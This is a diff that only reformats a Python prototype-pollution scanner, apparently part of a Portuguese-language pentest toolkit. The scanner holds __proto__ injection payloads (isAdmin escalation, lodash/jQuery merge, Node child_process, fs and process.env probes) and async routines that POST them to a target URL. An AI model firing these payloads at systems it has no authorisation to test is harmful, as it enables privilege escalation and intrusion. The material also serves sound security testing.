@@ -44,11 +44,41 @@ logger = logging.getLogger("mytools.prototypepollution")
 
 
 _CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
-    "detect": ["proto_basic", "proto_admin", "proto_role", "proto_settings", "proto_version"],
-    "constructor": ["ctor_basic", "ctor_admin", "ctor_role", "ctor_proto", "ctor_inject"],
-    "bypass": ["url_encode", "double_encode", "nested", "array_bracket", "dot_notation"],
-    "blind": ["blind_timing", "blind_reflection", "blind_stored", "blind_header", "blind_cookie"],
-    "impact": ["impact_isadmin", "impact_role", "impact_settings", "impact_rce", "impact_xss"],
+    "detect": [
+        "proto_basic",
+        "proto_admin",
+        "proto_role",
+        "proto_settings",
+        "proto_version",
+    ],
+    "constructor": [
+        "ctor_basic",
+        "ctor_admin",
+        "ctor_role",
+        "ctor_proto",
+        "ctor_inject",
+    ],
+    "bypass": [
+        "url_encode",
+        "double_encode",
+        "nested",
+        "array_bracket",
+        "dot_notation",
+    ],
+    "blind": [
+        "blind_timing",
+        "blind_reflection",
+        "blind_stored",
+        "blind_header",
+        "blind_cookie",
+    ],
+    "impact": [
+        "impact_isadmin",
+        "impact_role",
+        "impact_settings",
+        "impact_rce",
+        "impact_xss",
+    ],
     "dom": [
         "dom_url_param",
         "dom_hash",
@@ -61,14 +91,25 @@ _CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
         "dom_bracket",
         "dom_cookie",
     ],
-    "library": ["jquery_extend", "lodash_merge", "vue_reactive", "angular_scope", "node_require", "node_fs", "node_process", "node_eval"],
+    "library": [
+        "jquery_extend",
+        "lodash_merge",
+        "vue_reactive",
+        "angular_scope",
+        "node_require",
+        "node_fs",
+        "node_process",
+        "node_eval",
+    ],
 }
 
 
 def _load_category_map():
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "prototypepollution", default={"category_map": _CATEGORY_MAP_DEFAULT})
+    data = load_payloads(
+        "web", "prototypepollution", default={"category_map": _CATEGORY_MAP_DEFAULT}
+    )
     return data.get("category_map", _CATEGORY_MAP_DEFAULT)
 
 
@@ -107,7 +148,11 @@ _DETECT_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
 def _load_detect_payloads():
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "prototypepollution", default={"detect_payloads": _DETECT_PAYLOADS_DEFAULT})
+    data = load_payloads(
+        "web",
+        "prototypepollution",
+        default={"detect_payloads": _DETECT_PAYLOADS_DEFAULT},
+    )
     return [tuple(x) for x in data.get("detect_payloads", _DETECT_PAYLOADS_DEFAULT)]
 
 
@@ -146,8 +191,15 @@ _CONSTRUCTOR_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
 def _load_constructor_payloads():
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "prototypepollution", default={"constructor_payloads": _CONSTRUCTOR_PAYLOADS_DEFAULT})
-    return [tuple(x) for x in data.get("constructor_payloads", _CONSTRUCTOR_PAYLOADS_DEFAULT)]
+    data = load_payloads(
+        "web",
+        "prototypepollution",
+        default={"constructor_payloads": _CONSTRUCTOR_PAYLOADS_DEFAULT},
+    )
+    return [
+        tuple(x)
+        for x in data.get("constructor_payloads", _CONSTRUCTOR_PAYLOADS_DEFAULT)
+    ]
 
 
 _CONSTRUCTOR_PAYLOADS = _load_constructor_payloads()
@@ -185,7 +237,11 @@ _BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
 def _load_bypass_payloads():
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "prototypepollution", default={"bypass_payloads": _BYPASS_PAYLOADS_DEFAULT})
+    data = load_payloads(
+        "web",
+        "prototypepollution",
+        default={"bypass_payloads": _BYPASS_PAYLOADS_DEFAULT},
+    )
     return [tuple(x) for x in data.get("bypass_payloads", _BYPASS_PAYLOADS_DEFAULT)]
 
 
@@ -229,7 +285,9 @@ _BLIND_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
 def _load_blind_payloads():
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "prototypepollution", default={"blind_payloads": _BLIND_PAYLOADS_DEFAULT})
+    data = load_payloads(
+        "web", "prototypepollution", default={"blind_payloads": _BLIND_PAYLOADS_DEFAULT}
+    )
     return [tuple(x) for x in data.get("blind_payloads", _BLIND_PAYLOADS_DEFAULT)]
 
 
@@ -268,7 +326,11 @@ _IMPACT_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
 def _load_impact_payloads():
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "prototypepollution", default={"impact_payloads": _IMPACT_PAYLOADS_DEFAULT})
+    data = load_payloads(
+        "web",
+        "prototypepollution",
+        default={"impact_payloads": _IMPACT_PAYLOADS_DEFAULT},
+    )
     return [tuple(x) for x in data.get("impact_payloads", _IMPACT_PAYLOADS_DEFAULT)]
 
 
@@ -276,15 +338,51 @@ _IMPACT_PAYLOADS = _load_impact_payloads()
 
 
 _DOM_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
-    ("dom_url_param", '{"__proto__":{"polluted":"PP_DOM_URL"}}', ["polluted", "PP_DOM_URL"]),
-    ("dom_hash", '{"__proto__":{"polluted":"PP_DOM_HASH"}}', ["polluted", "PP_DOM_HASH"]),
-    ("dom_json_parse", '{"__proto__":{"polluted":"PP_DOM_JSON"}}', ["polluted", "PP_DOM_JSON"]),
-    ("dom_referrer", '{"__proto__":{"isAdmin":"PP_DOM_REF"}}', ["isAdmin", "PP_DOM_REF"]),
-    ("dom_window_name", '{"__proto__":{"polluted":"PP_DOM_WIN"}}', ["polluted", "PP_DOM_WIN"]),
-    ("dom_merge", '{"__proto__":{"polluted":"PP_DOM_MERGE"}}', ["polluted", "PP_DOM_MERGE"]),
-    ("dom_array", '[{"__proto__":{"polluted":"PP_DOM_ARR"}}]', ["polluted", "PP_DOM_ARR"]),
-    ("dom_nested", '{"a":{"__proto__":{"polluted":"PP_DOM_NEST"}}}', ["polluted", "PP_DOM_NEST"]),
-    ("dom_bracket", '{"__proto__":{"polluted":"PP_DOM_BRK"}}', ["polluted", "PP_DOM_BRK"]),
+    (
+        "dom_url_param",
+        '{"__proto__":{"polluted":"PP_DOM_URL"}}',
+        ["polluted", "PP_DOM_URL"],
+    ),
+    (
+        "dom_hash",
+        '{"__proto__":{"polluted":"PP_DOM_HASH"}}',
+        ["polluted", "PP_DOM_HASH"],
+    ),
+    (
+        "dom_json_parse",
+        '{"__proto__":{"polluted":"PP_DOM_JSON"}}',
+        ["polluted", "PP_DOM_JSON"],
+    ),
+    (
+        "dom_referrer",
+        '{"__proto__":{"isAdmin":"PP_DOM_REF"}}',
+        ["isAdmin", "PP_DOM_REF"],
+    ),
+    (
+        "dom_window_name",
+        '{"__proto__":{"polluted":"PP_DOM_WIN"}}',
+        ["polluted", "PP_DOM_WIN"],
+    ),
+    (
+        "dom_merge",
+        '{"__proto__":{"polluted":"PP_DOM_MERGE"}}',
+        ["polluted", "PP_DOM_MERGE"],
+    ),
+    (
+        "dom_array",
+        '[{"__proto__":{"polluted":"PP_DOM_ARR"}}]',
+        ["polluted", "PP_DOM_ARR"],
+    ),
+    (
+        "dom_nested",
+        '{"a":{"__proto__":{"polluted":"PP_DOM_NEST"}}}',
+        ["polluted", "PP_DOM_NEST"],
+    ),
+    (
+        "dom_bracket",
+        '{"__proto__":{"polluted":"PP_DOM_BRK"}}',
+        ["polluted", "PP_DOM_BRK"],
+    ),
     ("dom_cookie", '{"__proto__":{"polluted":"PP_DOM_CK"}}', ["polluted", "PP_DOM_CK"]),
 ]
 
@@ -292,7 +390,9 @@ _DOM_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
 def _load_dom_payloads():
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "prototypepollution", default={"dom_payloads": _DOM_PAYLOADS_DEFAULT})
+    data = load_payloads(
+        "web", "prototypepollution", default={"dom_payloads": _DOM_PAYLOADS_DEFAULT}
+    )
     return [tuple(x) for x in data.get("dom_payloads", _DOM_PAYLOADS_DEFAULT)]
 
 
@@ -300,10 +400,22 @@ _DOM_PAYLOADS = _load_dom_payloads()
 
 
 _LIBRARY_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
-    ("jquery_extend", '{"__proto__":{"polluted":"PP_JQUERY"}}', ["polluted", "PP_JQUERY"]),
-    ("lodash_merge", '{"__proto__":{"polluted":"PP_LODASH"}}', ["polluted", "PP_LODASH"]),
+    (
+        "jquery_extend",
+        '{"__proto__":{"polluted":"PP_JQUERY"}}',
+        ["polluted", "PP_JQUERY"],
+    ),
+    (
+        "lodash_merge",
+        '{"__proto__":{"polluted":"PP_LODASH"}}',
+        ["polluted", "PP_LODASH"],
+    ),
     ("vue_reactive", '{"__proto__":{"$polluted":"PP_VUE"}}', ["$polluted", "PP_VUE"]),
-    ("angular_scope", '{"__proto__":{"$$hashKey":"PP_ANGULAR"}}', ["$$hashKey", "PP_ANGULAR"]),
+    (
+        "angular_scope",
+        '{"__proto__":{"$$hashKey":"PP_ANGULAR"}}',
+        ["$$hashKey", "PP_ANGULAR"],
+    ),
     ("node_require", '{"__proto__":{"child_process":{}}}', ["child_process"]),
     ("node_fs", '{"__proto__":{"fs":{}}}', ["fs"]),
     ("node_process", '{"__proto__":{"process":{"env":{}}}}', ["process", "env"]),
@@ -314,7 +426,11 @@ _LIBRARY_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
 def _load_library_payloads():
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "prototypepollution", default={"library_payloads": _LIBRARY_PAYLOADS_DEFAULT})
+    data = load_payloads(
+        "web",
+        "prototypepollution",
+        default={"library_payloads": _LIBRARY_PAYLOADS_DEFAULT},
+    )
     return [tuple(x) for x in data.get("library_payloads", _LIBRARY_PAYLOADS_DEFAULT)]
 
 
@@ -343,7 +459,9 @@ _SSI_PARAMS_DEFAULT: list[str] = [
 def _load_ssi_params():
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "prototypepollution", default={"ssi_params": _SSI_PARAMS_DEFAULT})
+    data = load_payloads(
+        "web", "prototypepollution", default={"ssi_params": _SSI_PARAMS_DEFAULT}
+    )
     return data.get("ssi_params", _SSI_PARAMS_DEFAULT)
 
 
@@ -465,7 +583,9 @@ async def _test_detect(
 
                 resp = await client.post(url, json=json_data, follow_redirects=True)
 
-                vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)
+                vulnerable = _check_poll_response(
+                    resp.content, resp.status_code, indicators
+                )
 
                 results.append(
                     PollAttempt(
@@ -481,7 +601,9 @@ async def _test_detect(
                         status_changed=resp.status_code != b_status,
                         size_changed=len(resp.content) != b_size,
                         vulnerable=vulnerable,
-                        details=f"param={param}, indicators={indicators}" if vulnerable else "",
+                        details=f"param={param}, indicators={indicators}"
+                        if vulnerable
+                        else "",
                         error="",
                         exploit="__proto__[isAdmin]=true" if vulnerable else "",
                         tool="curl",
@@ -529,7 +651,9 @@ async def _test_constructor(
 
                 resp = await client.post(url, json=json_data, follow_redirects=True)
 
-                vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)
+                vulnerable = _check_poll_response(
+                    resp.content, resp.status_code, indicators
+                )
 
                 results.append(
                     PollAttempt(
@@ -545,7 +669,9 @@ async def _test_constructor(
                         status_changed=resp.status_code != b_status,
                         size_changed=len(resp.content) != b_size,
                         vulnerable=vulnerable,
-                        details=f"param={param}, indicators={indicators}" if vulnerable else "",
+                        details=f"param={param}, indicators={indicators}"
+                        if vulnerable
+                        else "",
                         error="",
                         exploit="__proto__[isAdmin]=true" if vulnerable else "",
                         tool="curl",
@@ -593,7 +719,9 @@ async def _test_bypass(
 
                 resp = await client.post(url, json=json_data, follow_redirects=True)
 
-                vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)
+                vulnerable = _check_poll_response(
+                    resp.content, resp.status_code, indicators
+                )
 
                 results.append(
                     PollAttempt(
@@ -609,7 +737,9 @@ async def _test_bypass(
                         status_changed=resp.status_code != b_status,
                         size_changed=len(resp.content) != b_size,
                         vulnerable=vulnerable,
-                        details=f"param={param}, indicators={indicators}" if vulnerable else "",
+                        details=f"param={param}, indicators={indicators}"
+                        if vulnerable
+                        else "",
                         error="",
                         exploit="__proto__[isAdmin]=true" if vulnerable else "",
                         tool="curl",
@@ -656,16 +786,22 @@ async def _test_blind(
                 if technique == "blind_timing":
                     t0 = time.monotonic()
 
-                    resp = await client.post(url, json={param: payload}, follow_redirects=True)
+                    resp = await client.post(
+                        url, json={param: payload}, follow_redirects=True
+                    )
 
                     elapsed = time.monotonic() - t0
 
                     vulnerable = elapsed > 2.0
 
                 else:
-                    resp = await client.post(url, json={param: payload}, follow_redirects=True)
+                    resp = await client.post(
+                        url, json={param: payload}, follow_redirects=True
+                    )
 
-                    vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)
+                    vulnerable = _check_poll_response(
+                        resp.content, resp.status_code, indicators
+                    )
 
                 results.append(
                     PollAttempt(
@@ -681,7 +817,9 @@ async def _test_blind(
                         status_changed=resp.status_code != b_status,
                         size_changed=len(resp.content) != b_size,
                         vulnerable=vulnerable,
-                        details=f"param={param}, indicators={indicators}" if vulnerable else "",
+                        details=f"param={param}, indicators={indicators}"
+                        if vulnerable
+                        else "",
                         error="",
                         exploit="__proto__[isAdmin]=true" if vulnerable else "",
                         tool="curl",
@@ -729,7 +867,9 @@ async def _test_impact(
 
                 resp = await client.post(url, json=json_data, follow_redirects=True)
 
-                vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)
+                vulnerable = _check_poll_response(
+                    resp.content, resp.status_code, indicators
+                )
 
                 results.append(
                     PollAttempt(
@@ -745,7 +885,9 @@ async def _test_impact(
                         status_changed=resp.status_code != b_status,
                         size_changed=len(resp.content) != b_size,
                         vulnerable=vulnerable,
-                        details=f"param={param}, indicators={indicators}" if vulnerable else "",
+                        details=f"param={param}, indicators={indicators}"
+                        if vulnerable
+                        else "",
                         error="",
                         exploit="__proto__[isAdmin]=true" if vulnerable else "",
                         tool="curl",
@@ -799,7 +941,9 @@ async def _test_dom(
 
                 resp = await client.post(url, json=json_data, follow_redirects=True)
 
-                vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)
+                vulnerable = _check_poll_response(
+                    resp.content, resp.status_code, indicators
+                )
 
                 results.append(
                     PollAttempt(
@@ -875,7 +1019,9 @@ async def _test_library(
 
                 resp = await client.post(url, json=json_data, follow_redirects=True)
 
-                vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)
+                vulnerable = _check_poll_response(
+                    resp.content, resp.status_code, indicators
+                )
 
                 results.append(
                     PollAttempt(
@@ -942,17 +1088,28 @@ def print_results(result: PollResult) -> None:
             print_exploit_info(v.exploit, v.tool)
 
     else:
-        print(color("\n  [+] Nenhuma Prototype Pollution detectada", Cyber.GREEN, Cyber.BOLD))
+        print(
+            color(
+                "\n  [+] Nenhuma Prototype Pollution detectada", Cyber.GREEN, Cyber.BOLD
+            )
+        )
 
     if blocked:
-        print(color(f"\n  [*] {len(blocked)} payloads bloqueados (403/429)", Cyber.YELLOW))
+        print(
+            color(f"\n  [*] {len(blocked)} payloads bloqueados (403/429)", Cyber.YELLOW)
+        )
 
     errors = [a for a in result.attempts if a.error and "403" not in a.error]
 
     if errors:
         print(color(f"\n  [-] {len(errors)} erros de conexao", Cyber.GRAY))
 
-    print(color(f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis", Cyber.WHITE))
+    print(
+        color(
+            f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis",
+            Cyber.WHITE,
+        )
+    )
 
 
 async def run_scan(
@@ -986,7 +1143,9 @@ async def run_scan(
                 attempts = await _test_detect(client, target, (b_status, b_size, b""))
 
             elif cat == "constructor":
-                attempts = await _test_constructor(client, target, (b_status, b_size, b""))
+                attempts = await _test_constructor(
+                    client, target, (b_status, b_size, b"")
+                )
 
             elif cat == "bypass":
                 attempts = await _test_bypass(client, target, (b_status, b_size, b""))
@@ -1075,9 +1234,18 @@ def build_parser() -> argparse.ArgumentParser:
         help="Categoria de testes (default: todas)",
     )
 
-    parser.add_argument("--concurrency", type=int, default=5, help="Requisicoes simultaneas (default: 5)")
+    parser.add_argument(
+        "--concurrency",
+        type=int,
+        default=5,
+        help="Requisicoes simultaneas (default: 5)",
+    )
 
-    parser.add_argument("--callback-url", dest="callback_url", help="URL de callback para deteccao out-of-band (opcional)")
+    parser.add_argument(
+        "--callback-url",
+        dest="callback_url",
+        help="URL de callback para deteccao out-of-band (opcional)",
+    )
 
     add_common_args(parser)
 
@@ -1113,7 +1281,9 @@ def main() -> int:
         parser=build_parser(),
         banner_fn=banner_art,
         run_fn=run_once,
-        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
+        has_target=lambda a: bool(
+            getattr(a, "url", None) or getattr(a, "target", None)
+        ),
         prompt="protopoll> ",
         description="Prototype Pollution interativo.",
         example="https://target.com -c detect",
